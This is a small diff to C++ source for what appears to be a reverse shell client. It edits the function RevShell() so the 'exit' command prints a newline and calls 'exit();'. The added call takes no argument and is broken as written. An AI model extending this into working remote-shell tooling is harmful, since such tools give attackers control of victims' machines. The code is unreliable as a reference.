@@ -55,8 +55,9 @@ void RevShell()
                 //Execute a pwd() function
             }
             else if ((strcmp(CommandReceived, "exit\n") == 0)) {
-                std::cout << "Command parsed: exit";
+                std::cout << "Command parsed: exit" << std::endl;
                 std::cout << "Closing connection" << std::endl;
+                exit();
                 //Exit gracefully
             }
             else {
